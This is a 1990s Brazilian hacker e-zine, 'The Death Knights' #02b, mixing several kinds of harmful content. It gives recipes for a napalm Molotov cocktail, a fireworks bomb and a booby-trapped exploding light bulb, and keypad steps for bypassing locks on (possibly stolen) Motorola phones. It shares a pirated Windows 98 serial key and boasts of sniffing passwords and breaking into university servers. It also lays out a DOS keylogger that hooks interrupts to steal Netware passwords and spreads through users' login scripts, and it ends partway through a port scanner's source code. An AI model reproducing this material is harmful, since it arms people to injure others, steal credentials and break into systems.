             T H E
        
       $$Pø"ý$b   ,gPø"ý$b   ,gPø""ý$b  ,gPø$$$$$$$$ý$b  ,gø   ý$b
       $$     $$  $$     $$  $$     $$       $$$$$$      $$     $$
       $$     $$  $$     "ý  $$     $$        $$$$       $$     $$
       $$     $$  $$Pý"  ,p  $$,   ,$$        `$$'       $$,   ,$$
       $$     $$  gg     $$  $$$$$$$$$         $$        $$$$$$$$$
       $$     $$  $$     $$  $$'   `$$         $$        $$'   `$$
       $$     $$  $$     $$  $$     $$         $$        $$     $$
       $$     $$  $$     $$  $$     $$        .$$.       $$     $$
       T$,   gP'  T$,   gP'  $$     $$        $$$$       $$     $$
       $$Pýýø"    $$Pýýø"    "ý     ý"        $$$$       "ý     ý"
                  ý"      <Cacaio>
                                     K N i G H T S

 ______________________________Death_Knights_________________________________
 ----------------------------------------------------------------------------


deathknights #02b

e-mail: death@deathknights.com

page: http://www.deathknights.com

 ______________________________Death_Knights_________________________________
 ----------------------------------------------------------------------------


.-----------.
|   SECOES   \_______________________________________________________________
`----------------------------------------------------------------------------'

1  * ESCLARECiMENTOS                     Cacaio
2  * CELULAR STUFF                       BlydD
3  * ANARCHY                             Cacaio
4  * ANARCHY [2]                         ReNeGaDe
5  * CHEATiNG DOS GAMES                  Cacaio
6  * Mailing LiST                        Cacaio
7  * Win 98 Bugs                         Macleod
8  * foi na USP                          Bloddy Killer (BK)
9  * Dicas para lamers                   Cacaio
10 * Entrando pela porta da frente       Milly
11 * PortScan                            Cacaio
12 * WinNT Passwords [Parte 2]           Cacaio

--

13 * BONUS [1]                           Macleod
14 * BONUS [2]                           Cacaio
15 * FEW WORDS                           Cacaio

 ______________________________Death_Knights_________________________________
 ----------------------------------------------------------------------------

-=[  1  ]=-
.----------------.
| ESCLARECiMENTOS \__________________________________________________________
`----------------------------------------------------------------------------'


        Nao nos responsabilizamos pela informacao contida neste zine. Se voce
usar indevidamente qualquer informacao contida aqui, a responsabilidade e' to-
da sua.
        Este grupo nao visa nenhum fim lucrativo. Nos fazemos isto por diver-
sao e nada mais.
        Se voce nao gostou da informacao contida aqui, nao nos perturbe. O
problema e' todo seu.

        A secao de E-MAiL'z foi retirada deste numero da zine, pois a zine
ja estava com um tamanho um pouco grande, e nao queriamos fazer algo sacal.
A quem mandou e-mail, muito obrigado, nos lemos todos, e respondemos aos
que mereciam ser respondidos.

-=[  2  ]=-
.----------------------------------------------------------------------.
| DESBLOQUEiO, MODiFiCACAO E PROTECAO DA OPERACAO DE APARELHOS MOTOROLA \____
`----------------------------------------------------------------------------'
                                 by BlydD

        Tipow, acabei de chegar em casa, e tive a ideia de escrever esta
  materia. Jah faz alguns meses que nao escrevo nada, entao estah aqui a 
  minha parte.
        Entao segura esta, porque ela eh fresquinha e eu descobri.
        Estive  pensando um dia desses, como eu poderia burlar o cadeado
  eletronico dos motorola.
        Nao eh algo muito util, mas quando se tem um  celular  bloqueado
  em suas maos, esse macetezinho pode ser usado.
        Nao queria fazer algo muito grande, mas acho que vai acabar ficando.
        Sendo assim, dividi este assunto em partes:

        1 - DESCOBRINDO O CODIGO
        2 - MODIFICANDO O CODIGO
        3 - PROTEGENDO SEU CELULAR CONTRA ISSO (ninguem faz isso. hehehe)
      
      .-------------------------------------.  
      | 1 - DESCOBRINDO O CODIGO             `-------------------------.
      `=================-=-====--==-=-=-===----==---=-=---=-=--- -- -  -
        
        Quando  alguem trava  um celular  motorola, ele fica praticamente 
  inoperante, a nao ser a utilizacao da tecla de emergencia (Turbo Dial).
  e a outra seria o POWER. (hehehehe). Agora tem outra que ninguem ainda
  divulgou era o FCN (Funcao).
        Eh a partir desta tecla que vamos comecar a brincar com o celular.
        Agora roube um celular ou pegue o seu proprio celular, caso vc tiver.
        Os aparelhos que podem ser usados este macete sao de PT 550 ateh 
        Ultra TAC 750).
        Se ele jah estiver bloqueado, otimo!
        Passos:
        1o - [FNC] + [0] + [COD. SERV. 2x] + [RCL]
                                |
                                `---> 000000
        2o - Pressione [*] 15x
        Pronto, o numero que aparece aih, eh o codigo de uso do celular.
        Se  quizer  voltar, basta desligar  e ligar  o aparelho, que jah
  estarah desbloqueado e melhor ainda, voce jah sabe a senha dele.
        
      .---------------------------------------.  
      | 2 - MODIFICANDO O CODIGO               `-----------------------.
      `=================-=-====--==-=-=-===----==---=-=---=-=--- -- -  -

        Certo, agora se queremos que o celular seja de nosso dominio, 
  devemos mudar o codigo dele.
        Para fazer isto, siga os passos abaixo:
        1o - [FCN] + [0] + [COD. SERV. 1x] + [NOVO CODIGO] + [STO]
        Importante: O celular tem que estar desbloqueado anteriormente para
  ser feita esta operacao.
                    Caso o mesmo ainda estiver bloqueado, siga os passos do
  item (1 - DESCOBRINDO O CODIGO) e quando for mostrado o numero atual, digite
  o novo numero, pressione [*] e depois aperte [SND]

      .---------------------------------------.  
      | 3 - PROTEGENDO SEU CELULAR CONTRA ISSO `-----------------------.
      `=================-=-====--==-=-=-===----==---=-=---=-=--- -- -  -
        
        Isso que  eu vou  falar,  pretendo que nao  seja  espalhado  tao
  publicamente  como jah eh  proposto pelo  ZINE,  pelo motivo de quanto
  mais pessoas souberem, menos celulares teremos. hehehe
        Certamente  voce nao deve  ter entendido  o que  eh o COD. SERV.
        Isso significa, o codigo de servico do celular. Vejamos,  quando
  voce habilita um celular, a empresa deveria dizer para voce, "Ei, qual
  o codigo  de  servico que  voce  deseja?". Mas isso nao eh perguntado,
  porque vc obviamente, responderia, "que isso?" hehe.
        Codigo de servico, eh o codigo geral de operacao do seu celular.
        Nao eh  recomendado a todas as pessoas, devido a falta de QI do
        pessoal para guardar senhas.
        Esse codigo consiste-se em 6 numeros.
        
      .----------------------------------------------------------------.
      | Importante: O padrao de COD. DE SERV. da Motorola eh o 000000. |
      |             O padrao de senha de uso da Motorola eh o 123.     |
      `----------------------------------------------------------------'

        Para vc muda-lo basta seguir estes passos:
        1o - [FNC] + [0] + [COD. SERV. 2x] + [RCL]
        2o - Pressione [*] 13x
        3o - Digite o novo codigo (6 numeros)
        4o - Pressione [*] + SND

        Outra coisa, se o codigo de  servico for  mudado, bye  bye. Soh
  abrindo a porcaria do celular e resetando a eprom, eh claro, isso nao 
  dah para ser explicado aki.
        Se  tiverem interesse  em  tirar  duvidas ou  apresentar  novas
  ideias, aqui estah o meu email. 
        Ateh mais, agora preciso ir ao banheiroooo.
                        
                        BlydD@deathsdoor.com

                Cya!


-=[  3  ]=-
.---------.
| ANARCHY  \_________________________________________________________________
`----------------------------------------------------------------------------'
                                 by Cacaio

Antes de iniciar, queremos deixar bem claro que nao temos nenhuma
responsabilidade do que pode acontecer se executado algum dos procedimentos
citados, tendo em vista que alguns poderao te deixar em grandes problemas, 
preso e levar a danos fisicos, morais, materiais e alguns ate a morte.

        
        Correntes de Bicicleta...

        Se voce quer abrir uma corrente de bicicleta cuja tranca e' por 
senha numerica, aqui voce sabera como. Nao e nem um pouco dificil, qualquer
um pode fazer isto.
        Vamos a pratica! Digamos que a combinacao tem 4 numeros. Entao voce
puxa para ambos os lados a corrente, e veja se as 4 catracas se movem. Mova
a ultima catraca para todas as posicoes possiveis ate que ela nao se mexa.
Digamos, neste caso, que parou no 5, entao voce ja sabe que o primeiro numero
e 5 e que a combinacao e 5???. Entao, repita o procedimento com todas as ca-
tracas, do mesmo modo, ate que apenas as ultimas se mexam. Digamos que parou
no 4 agora, logo a combinacao e 54??. E voce vai fazendo a mesma coisa ate
encontrar todos os numeros. O terceiro e 1 e o quarto 3, logo a combinacao e
5413, basta puxar a corrente que esta aberta.

                                            Lembre-se, isto e apenas dizendo
                                            como fazer isto, e nao um incen-
                                            tivo a roubar bicicletas.


        Cocktail Molotov...

        Como fazer a maioria ja sabe, basta uma garrafa, combustivel, um
pedaco de pano e pronto. Mas ai esta o problema: o combustivel evapora 
muito rapidamente, assim seu efeito e pequeno. Mas aqui neste zine mostraremos 
como fazer e utilizar um combustivel usado em Cocktail Molotov na primeira
guerra mundial, e era jogado nos tanques de guerra para que os soldados se
rendessem, devido ao grande calor e a dificuldade deste combustivel evaporar.
Ai vai como fazer este combustivel:

Coloque um pouco de gasolina em uma garrafa ou outro recipiente qualquer.
Adquira um pouco de estiro-espuma e coloque junto com a gasolina, ate que a
gasolina pare a reacao com o produto. Agora, voce tera um xarope pegajoso.
Coloque este combustivel na garrafa, ao inves do outro que voce usa
normalmente.

   Pronto! Voce ja sabe como fazer Cocktail Molotov com Napalm(o combustivel).
Se lembre de NUNCA tocar o Napalm, e o guarde bem, pois ele dura muito tempo.


        Como fazer uma bomba simples...

        Esta e'  uma bomba simples e so de efeito moral. Pra quem so' quer se
divertir, e' uma boa.

                                    MATERIAL
                 
                    °°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
                    °°         2 sacos plasticos         °°
                    °° 1 pedra quadrada (4x4x4cm aprox.) °°
                    °°             10 rojoes             °°
                    °°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°


        Coloque os sacos plasticos(daqueles de mercado) um dentro do outro.
        Tire a polvora dos rojoes e coloque no saco plastico que esta dentro
do outro, amontoada, ou nao funcionara.
        Coloque a pedra em cima da polvora, amarre o saco bem apertado sendo
que a pedra nao fique 'sambando' no saco. 
        Pronto! Para explodir basta jogar o saco onde quiser que exploda, mas
o saco tem que cair de pe, para que funcione.


                              Cacaio@a-Vip.com


-=[  4  ]=-
.------------.
| ANARCHY [2] \______________________________________________________________
`----------------------------------------------------------------------------'
                                 by ReNeGaDe


        Nao sou de ir falando muito, entao la vai o que tenho pra ensinar pra
voces:

Lampada que quando acende explode:

Pegue uma lampada normal e faca um furo no bocal a parte metalica apos ter
feito o furo pegue um pouco de polvora, e derrame fazendo com que caia no
filamento depois e so recolocar a lampada no lugar mais se certifique que
esteja desligada a corrente depois e so esperar que o otario acenda a luz
e b00m!

Pedra de sodio:

Pegue uma pequena pedra de sodio (sodio metalico) do tamanho de um tijolo
e jogue na agua mas se certifique que esteja bem longe pois vai ser um
estouro muito forte e perigoso.



-=[  5  ]=-
.--------------------.
| CHEATiNG DOS GAMES  \______________________________________________________
`----------------------------------------------------------------------------'
                                 by Cacaio

        Pra comecar vou falar o por que desta materia; um dia, eu estafa
falando com um amigo meu sobre o Debug e ele me falou que poucas pessoas
sabiam usa-lo, e que seria uma boa eu fazer uma materia usando o mesmo.
Entao, eu gostei da ideia e fiz a materia, mas alem do Debug ensino tambem 
outros modos... vamos la!

      .----------------.  
      | 5.1 - ViA DEBUG `----------------------------------------------.
      `=================-=-====--==-=-=-===----==---=-=---=-=--- -- -  -

        Abra o diretorio e chame o Debug. Ao fazer isso, o prompt fica com
um hifem amtes do cursor, assim:

-

        Em seguida, basta executar a receita do cheat para conseguir os
efeitos desejados. Para voce entender o que esta fazendo, fique ligado
no significado de alguns comandos mais comuns:

                n - especifica o nome do arquivo a ser mudado
                l - carrega o conteudo do arquivo chamado
                e - comando para ativar a mudanca
                w - salva as mudancas feitas no arquivo
                q - sai do debug

Exemplo: usando o Debug para ficar com $ 2 bilhoes em SimCity 2000

-n simcity1.sc2 [ENTER]
(para chamar o arquivo no qual sera feita a mudanca)

-l 100 [ENTER]
(carrega a parte do arquivo que sera mudado)

-e 127 [ENTER]
(localiza o enderecoa ser mudado. Em seguida, o computador mostrara o
conteudo daquele endereco, que e o que voce deve alterar)

129D:0127 XX.
(nesta linha, XX sao um numero qualquer que o computador lhe fornece. Depois
de XX., digite 7F e tecle espaco)

129D:0128 XX.
(depois do XX. digite 02 e espaco)

XX.
(depois do ponto, digite FF e espaco)

-w
(salva as mudancas)

-q
(sai do debug)

        Pronto! Voce acaba de alterar o jogo e sair do Debug. Agora e so
rodar novamente o jogo e esbanjar grana! ;P


      .-----------------------.  
      | 5.2 - ViA OUTRO EDITOR `---------------------------------------.
      `=================-=-====--==-=-=-===----==---=-=---=-=--- -- -  -

      Use um editor hexadecimal qualquer, como o hedit, X-Tree, Norton,
PC Tools ou qualquer outro. Abra o arquivo. Ah... pra quem nao sabe, o
editor mostraa o conteudo do arquivo em hexadecimal (numeracao em base 16).

        Na coluna da esquerda estao os numeros correspondentes aos enderecos
do programa; na da direita ficam os dados do arquivo, separados em 16 offsets.
Para alterar um programa, basta localizar o endereco e alterar.

Exemplo: usando um editor hexadecimal para ficar com $ 2 bilhoes em SC 2000

        Localize o endereco 0020 na coluna da esquerda, e nesta linha, mude
o oitavo offset para 7F, o nono para 02, o decimo para FF e o decimo primeiro
para FF. Salve o arquivo e pronto... voce fez a mesma coisa que foi feita com
o Debug.

                              Cacaio@a-Vip.com


-=[  6  ]=-
.--------------.
| Mailing LiST  \____________________________________________________________
`----------------------------------------------------------------------------'
                                 by Cacaio



-LiST
Temos agora uma mailing list que fala de tudo, mas nao sao todos quem podem
participar. Se voce acha que tem chances em participar da lista, mande um
e-mail para death@deathknights.com dizendo o por que de voce querer participar
da lista e seu e-mail real. Nao garantimos que todos que mandarem e-mail
entrarao na lista.

                               Bem... eh isso!


-=[  7  ]=-
.------------.
| Win98 Bugs  \______________________________________________________________
`----------------------------------------------------------------------------'
                                 by Macleod

Quando vi a reportagem do win98, fiquei todo empolgado, afinal a microsoft 
ate que enfim iria lancar um os que talvez prestasse, depois das varias reclamacoes
com o win95, resolvi fazer o download, que nao e pequeno(72-73 discos), e' 
rapido so pra quem tem um cable modem, que e equipamente paleozoico nos eua(la se usa isdn), e
futuristico no Brasil :P,o win98 tem bem mais bugs do que o win95, alem de 
rodar bem mais lento tb, dentro os bugs e prolemas que pude constatar estao:

1-error 625- nao estabelece conexoes, indicando problemas no provedor
2-o windows update( atualizador de programas para win98) nao funciona
3-a instalacao nao permite que o usuario nao instale o ie40
4- o driver converter(fat32) deixa seu hd com 25% a mais de espaco, mas deixa
o pc mais lento, alem de nao permitir que vc instale o win95 devolta
5-o defrag trava sempre e dificilmente passa dos 10%

esses problemas foram encontrados na versao build 1689
a ultima versao do win98 e' o build 1721.3, pelo menos era ate abril/98 :P
se vc quiser mesmo assim, fazer o download do win98 va em:

ftp://ftp.resnet.ucla.edu  --> anon ftp
ftp://ftp.sinclair.edu     --> anon ftp

se esse ftp nao funcionar me mande um email que eu procuro pra vc e te passo
outro endereco,a ultima versao tem 72 discos e o serial number e':

HGBRM-RBK3V-M9FXV-V38J4

existe tb o plus 98 , um addon pro win98, que pode ser obtido em :

ftp://129.21.115.4 --> anon ftp

nesse endereco vc encontra tb o win98 e o win nt 5 beta, mas esse ultimo so
aconselho a instalacao se vc tiver no minimo um pentium 166 MMX
a versao final do win98 vc vai poder fazer o download em ftp warez em 25 de
junho, esse e a previsao
informacoes para usuarios do win98:http://www.zdnet.com/zdhelp/win_help/win98_htlp/html
O melhor mesmo é vc esperar a versao final ou ficar com seu win95, ou ate 
se vc for mais inteligente, instale o linux :P

        cya
                        diablo_br@yahoo.com


-=[  8  ]=-
.------------.
| foi na USP  \______________________________________________________________
`----------------------------------------------------------------------------'
                                   by BK

heya d00d

bom... vim falar sobre um assunto muito loko q eu e um amigo fizemos
foi na USP de Ribeirao Preto.
bom...
tudo comecou assim:

D-Fuhrer(meu amigo) conseguiu uma shell com um amigo dele numa maquina linux
da USP... e ele rodou sniffer la... e pegou uma porrada de senhas da maquina
da Faculdade de Medicina de Ribeirao Preto (FMRP)... 290k de log
isso pq rodou por menos de 12 horas... imaginem se tivesse rodado por 1
semana... ia ser enorme
mas beleza..
bom... rodou nesse pouco tempo pq ele contou pro amigo dele e
eles brigaram .. perderam amizadade e tal.. mas ele conseguiu pegar o log
pelo menos...  isso a mais ou menos 9 a 10 meses.
bom.. eu ainda nao tinha muita amizade com o D-Fuhrer... entao nao tinha 
pq ele me passar... mas la pra julho (isso foi +- em marco) ele me passou o
log do sniffer... eu usei bastante essas senhas (PS: sao PPP e shell)
la pro fim do ano... na epoca do natal(1997)
quase todas as senhas foram canceladas... e tanto eu qto ele nao tinhamos
conseguido hackear a FMRP(SunOS 5.5.1) em uma noite... eu consegui um
exploit q funcionou... hackeei la.. peguei o passwd inteiro... liguei
prele.. passei prele... de 400 e poucas senhas.. deu pra desencriptar quase
200...
blz..
depois mais pra frente.. um outro amigo meu me passou a shell
da mae dele(Medica da USP) EERP(Escola de Enfermage de Ribeirao Preto
(Linux 1.2.18) fui la.. hackeei.. mas essas eram so shells mesmo... 
rodei sniffer.. pegou algumas ppp da... CIRP
(Centro de Informatica de Ribeirao Preto) mas nao tinham shells hehhehe
mas tudo bem passei pro D-Fuhrer tbm... uma outra noite eu fui durmir la na
casa dele.. e comecamos testar essas senhas em outras maquinas...
e funcionou em mais umas 3... SunOS 5.5.1 ... hackeamos tbm...

2 AIX... hackeamos tbm...
mas as PPPs sao somente 10 da cirp e quase 200 da
fmrp... bom.. a USP chegou a contratar uma empresa pra tentar pegar a gente..
e nao conseguiu... nos cansamos e resolvemos mandar um email pra eles
falando sobre o q fizemos ... e escrevemos tbm q nao iamos estragar nada..
deletar nada.. alterar... e ler nada de ninguem.. q nosso interesse era
apenas contas PPP ... queriamos 2 contas PPP uma pra mim(BK) e outra pro
D-Fuhrer ... mandamos nossos telefones... nossos nomes... nossos emails e
tudo mais... em menos de 1 semana a USPNet foi fechada... ficou quase 1 mes
destavida pra acessos discados.... eles deletaram todos os USERS da
FMRP / CIRP / EERP / GENBOV (Genetica Bovina... AIX) e mais um monte....
e convocaram todos de novo pra recadastro .... 
sei la.. preferiram RECADASTRO TOTAL do q criarem 2 contas...
bom... se nos conseguirmos 1 shell la.. pode ter certeza q vai ser diferente
nao vamos estragar nada... 
ah.. caso vc q esteja lendo seja da USP de Ribeirao Preto... 
pergunte pro Admin da FMRP do Igor(BK) e do Eduardo(D-Fuhrer)
ah.. nao tivemos intencao de dar tanto trabalho pra voces.. q chegaram a
contratar uma empresa pra nos achar! hehhehe

blz galera

ate' a proxima zine...
to no IRC
meu nick -> BK ou bogomips (BrasNET / BrasIRC)

        cya l8er!

                            bogomips@deathsdoor.com

-=[  9  ]=-
.-------------------.
| Dicas para lamers  \_______________________________________________________
`----------------------------------------------------------------------------'
                                 by Cacaio

        ATENCAO LAMERS! Primeira lista de dicas totalmente dedicada a voces!

          30 dias que sao a sua cara! Desenvolvidas para voces!

        Facam tudo o que diz aqui e nunca mais serao os mesmos!

°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
01. Antes de tudo, tire uma foto do seu micro.
02. Seja sempre um mexe-mexe! Nada de cursos, revistas e livros especializados.
03. Limpe o video com alcool e agua sanitaria.
04. Entre no Setup, fuxique e troque algumas coisas.
05. Coloque uma senha no Setup: que tal Schwartznneagger?
06. Mantenha a impressora sempre ligada.
07. Crie um ramdrive e instale seu sistema operacional nele.
08. Disquetes ficam melhor armazenados em armarios de ferro ou aco.
09. E' bom o micro pegar sol: evita o 'Cold Start'.
10. Quando o cartucho InkJet estiver no meio, complete com querosene.
11. Limpe as placas da CPU com esponjas de aco para dar brilho.
12. Se voce usa DOS, substitua o seu COMMAND.COM por um menor, do dos 2.11.
13. Memoria sobrando? Venda-a ou troque por disquetes de 360k.
14. Fique atento as novidades de informatica lancadas pelos Monges no Tibet.
15. Desligue o botao de Turbo.
16. Winchester cheio demais? Apague asteriscos!
17. Dois ou mais CD's cabem numa mesma capa: basta ficarem de frente.
18. Economize IRQ'z: coloque o mesmo para o Mouse, para o Modem e para a placa
de Som!
19. Deixe o gabinete aberto para ventilar a barra-bus.
20. Espirrou no teclado? Jogue um pouco de talco nele.
21. Quando a fita da impressora estiver fraca, coloque o papel dobrado.
22. Para limpar fiapos do teclado, passe um alfinete entre as teclas.
23. Multimidia? Entao aproveite para gravar todos seus CD's no winchester!
24. Na sala do computador use carpete ou tapete.
25. Quando cair a energia, deixe todos os botoes ligados ate voltar.
26. Nao se preocupe com trovoadas: o raio ate facilita que os bits deslizem.
27. No inverno cubra seu micro com um cobertor.
28. Copie seu sistema operacional para disquetes de 360k.
29. Desconfie do software que sua namorada gostar.
30. Agora olhe a foto do inicio para se lembrar de como era bom antes disso
tudo!
°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°

                               Cacaio@a-Vip.com

-=[  10  ]=-
.-------------------------------.
| Entrando pela porta da frente  \___________________________________________
`----------------------------------------------------------------------------'
                                 by Milly



Ola, sou Milly, a mais nova colaboradora do The Death Knights.
Minha especialidade e' sistemas PC.

Uma das minhas primeiras peripecias foi a invasao de uma netware. Para conseguir
isso usei uma filosofia bem simples, por que arrombar a janela se abrir a porta
da frente e mais facil e menos suspeito? Portanto ao inves de forcar a barra
chamando a atencao do servidor e consequentemente do supervisor eu esperei
pacientemente que o supervisor me entregasse sua password.
Apos verificar que os usuarios nao resetavam os micros apos a utilizacao eu
me aproveitei dessa brecha e me instalei no teclado, armazenando a senha em
uma area publica que criei.
Portanto segui o seguinte plano:

1. cirava uma area publica acima de qualquer suspeita
   (distribuicao de shareware)
2. me instalava na memoria;
3. aguardava a execucao do arquivo LOGIN.EXE
4. armazenava em um arquivo o nick e o pass
5. "infectava" o login script dos usuarios inexperientes
 
LOCALIZANDO O EXECUTAVEL

Para aguardar a execucao do arquivo LOGIN.EXE foi preciso me instalar na
INT 21h. A funcao 4Bh carrega e executa um programa na memoria:

INT 21 - DOS 2+ - "EXEC" - LOAD AND/OR EXECUTE PROGRAM
    AH: 4Bh
    AL: type of load
        00h - load and execute
        01h - load but do not execute (debugger)
        03h - load overlay
        04h - load and execute in background (European MS-DOS 4.0
            only) "Exec & Go" (see also AH=80h)
    DS:DX: ASCIIZ program name (must include extension)
    ES:BX: parameter block (see below)
    CX: mode (subfunction 04h only)

Format of EXEC parameter block for AL=00h,01h,04h:
Offset  Size    Description
 00h    WORD    segment of environment to copy for child process
                (copy caller's environment if 0000h)
 02h    DWORD   pointer to command tail to be copied into child's
                PSP
 06h    DWORD   pointer to first FCB to be copied into child's PSP
 0Ah    DWORD   pointer to second FCB to be copied into child's
                PSP
 0Eh    DWORD   (AL=01h)
 12h    DWORD   (AL=01h)

Apos detectar a chamada ao LOGIN.EXE existe a possibilidade do usuario
(entenda-se lamer) ter digitado o nick na linha de comando, portanto foi
preciso verificar a existencia de algum argumento e ja armazena-lo no arquivo
de senhas.

TRATAMENTO DO TECLADO

Depois de digitar a linha de comando o usuarios tem que digitar o nick e o
pass, ou simplesmente o pass. Ai entra a interrupcao 09h, essa interrupcao e'
ativada por hardware atraves da IRQ 1 ativado pelo controlador do teclado.
Quando a interrupcao do teclado e chamada um dado e colocado no port 60h,
porem deixei o tratamento da interrupcao para o DOS e me preocupei somente
com o que foi digitado. Portanto precisei tambem me instalar na INT 09h.
No tratamento de chamda o DOS recupera o dado do controlador do teclado e o
insere na lista circular do teclado ou nas flags de status e por ultimo
re-habilita o controlador de interrupcao. O buffer do teclado segue o seguinte
mapeamento:

40h:1Ah - POINTER TO NEXT CHARACTER IN KEYBOARD BUFFER (word)
40h:1Ch - POINTER TO FIRST FREE SLOT IN KEYBOARD BUFFER (word)
40h:1Eh - DEFAULT KEYBOARD CIRCULAR BUFFER (16 words)

1Ah  1Ch  1Eh                                             3Eh
++---++--++--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--++
||OUT||IN||  |  |  |  | CIRCULAR BUFFER |  |  |  |  |  |  ||
++---++--++--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--++
                 ^                          ^
                 IN                        OUT

O ponteiro OUT e o offset para a 1a tecla a ser retirado da lista. O ponteiro
IN e o offset para o 1o espaco livre onde a INT 09h deve colocar a proxima
tecla pressinada. Ja, o buffer circular contem 16 words cada representando o
codigo da tecla e o caracter correspondente, respectivamente.
Quando um dado e inserido no Buffer Circular e verificado inicialmente se IN+2
e' igual a OUT, neste caso o buffer esta cheio e nao e inserido nenhum
caracter, enquanto que o beep caracteristico e acionado. No caso do buffer nao
estar cheio coloca-se os dados na posicao apontada por IN que entao e'
incrementado duas vezes.
No caso de se retirar algo do buffer verifica-se se OUT e' igual a IN, neste 
caso o buffer esta vazio, e nao ha caracteres a se retirar. No caso do buffer 
nao estar vazio retira-se os dados na posicao apontada por OUT que entao e
incrementado duas vezes.

NOTA: o incremento de ponteiros para buffers circulares deve se manter dentro
dos limites do buffer, portanto ao se incrementar um ponteiro alem do limite
superior do buffer deve-se retorna-lo ao inicio do buffer.

Nesse caso eu nao precisei inserir ou retirar nenhum tipo de dado do Buffer 
de teclado. O que foi feito foi ao ser chamada a INT 09h armazenei o valor do
ponteiro IN e chamei a rotina antiga de tratamento de interrupcao, que
incrementara o ponteiro IN do buffer no caso de ser tratar de uma tecla de
caracter.
Apos chamar a rotina antiga eu vou verificar se foi inserido algo no buffer,
se o ponteiro IN for diferente do antigo ponteiro IN leio o que foi inserido,
e' o caracter que precisamos.

MANIPULACAO DE ARQUIVO

Bem, agora ja temos o tratamento da INT 21h e da INT 09h, falta agora a rotina
de gravacao do arquivo. Para isso foi preciso a rotina de acesso a disco mais
rapida e menor possivel, o que encontrei em C foram as rotinas em IO.H: open
e relacionadas, por chamarem a interrupcao diretamente se encaixam perfeitamen-
te nos requisitos necessarios.
Os serviços de interrupcao de manipulacao de arquivos sao:

INT 21 - DOS 2+ - "OPEN" - OPEN EXISTING FILE
    AH: 3Dh
    AL access and sharing modes
    DS:DX: ASCIZ filename
    CL: attribute mask of files to look for (server call only) 
    Return: if CF clear: SUCCESSFUL
               AX: file handle
            if CF set: ERROR
               AX: error code 

INT 21 - DOS 2+ - "CLOSE" - CLOSE FILE
    AH: 3Eh
    BX: file handle
    Return: if CF clear: SUCCESSFUL
               AX: destroyed
            if CF set: ERROR
               AX: error code

INT 21 - DOS 2+ - "READ" - READ FROM FILE OR DEVICE
    AH: 3Fh
    BX: file handle
    CX: number of bytes to read
    DS:DX: buffer for data
    Return: if CF clear: SUCCESSFUL
               AX: number of bytes read (0 if at EOF before call)
            if CF set: ERROR
               AX: error code 

INT 21 - DOS 2+ - "WRITE" - WRITE TO FILE OR DEVICE
    AH: 40h
    BX: file handle
    CX: number of bytes to write
    DS:DX: data to write
    Return: if CF clear: SUCCESSFUL
               AX: number of bytes actually written
            if CF set: ERROR
            AX: error code

Antes de armazenar os dados no arquivo, deixe-os na memoria a espera de um
enter, que provavelmente indicaria a execucao de um comando qualquer, e
consequentemente um acesso a rede.
Para evitar bisbilhoteiros eu criptografei o arquivo de senhas, atraves de uma
chave de um byte aplicada com XOR no arquivo. Recomendo funcoes que podem ser
facilmente recuperadas, como ADD, SUB ou XOR, rapidas, simples e eficazes.

"Infeccao" do login-script

Logo apos conseguir uma senha podemos utilizar as informacoes de usuarios
avançados e/ou importantes. Porem ainda existem aqueles usuarios que mal
utilizam a rede. Aparentemente inuteis esses usuarios podem se tornar seus
colaboradores, basta para isso inserir em seus login-script uma linha que
execute seu arquivo, dessa forma em todos os computadores que esses usuarios
logarem estarao aptos a robarem senhas para voce.

Ultimas Consideracoes

Preste muita atencao no nome em que colocara no executavel, como ele nao se
esconde na memoria, portanto um MEM /C podera identificar um invasor (caso
seja utilizado GETPASS.EXE), portanto deve-se utilizar nomes parecidos com
drivers de rede, como VMS ou AIX, procure ler alguns livros de redes ethernet
ou netware.

      E' isso ai, me coloco a disposicao de duvidas!



                               MillyPad@hotmail.com.

-=[  11  ]=-
.----------.
| PortScan  \________________________________________________________________
`----------------------------------------------------------------------------'
                                by Cacaio

        Aih pessoal, eu tava sem o que fazer e resolvi fazer um port scanner.
Pra que serve? Se voce nao sabe, nem compile... ja que voce nao sabe o que e',
pode ser um virus! Isto e bastante util se voce souber usar.

Bem... aih vai o source!!!

-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------

/* file psctdk.c by Cacaio  */

/*
 *            T H E
 *       
 *      $$Pø"ý$b   ,gPø"ý$b   ,gPø""ý$b  ,gPø$$$$$$$$ý$b  ,gø   ý$b
 *      $$     $$  $$     $$  $$     $$       $$$$$$      $$     $$
 *      $$     $$  $$     "ý  $$     $$        $$$$       $$     $$
 *      $$     $$  $$Pý"  ,p  $$,   ,$$        `$$'       $$,   ,$$
 *      $$     $$  gg     $$  $$$$$$$$$         $$        $$$$$$$$$
 *      $$     $$  $$     $$  $$'   `$$         $$        $$'   `$$
 *      $$     $$  $$     $$  $$     $$         $$        $$     $$
 *      $$     $$  $$     $$  $$     $$        .$$.       $$     $$
 *      T$,   gP'  T$,   gP'  $$     $$        $$$$       $$     $$
 *      $$Pýýø"    $$Pýýø"    "ý     ý"        $$$$       "ý     ý"
 *                 ý"
 *                                        K N i G H T S
 *
 * Portscan 1.2 by Cacaio
 * Please, if you use my code give me credit.
 * This code is made specially for The Death Knights.
 * Visit our webpage at http://www.deatahknights
 * If you want to contact me, e-mail me. <cacaio@deathknights.com>
 *
 */

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>

#define MAX_PORT 1024
int s;
struct sockaddr_in addr;
char rmt_host[100];

int skan(port)
int port;
{
 int r;
    s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s < 0) {
       /* Error - what do ya think? :P */
       printf("[0;36mE[1mRROR[34m: [37m[0msocket() failed\n");
       exit(0);
    }

    addr.sin_family = PF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(rmt_host);

    r = connect(s,(struct sockaddr *) &addr, sizeof(addr));

    close(s);
    if (r==-1) {
       return (1 == 0);
    }

    return (1 == 1);
}

main(argc,argv) 
int argc;
char *argv[];
{
 int a,b,c,d,e,f;
 struct hostent *foo;
 struct servent *bar;

   if (argc < 2) {
       /* returns when not used with proper parameters. */
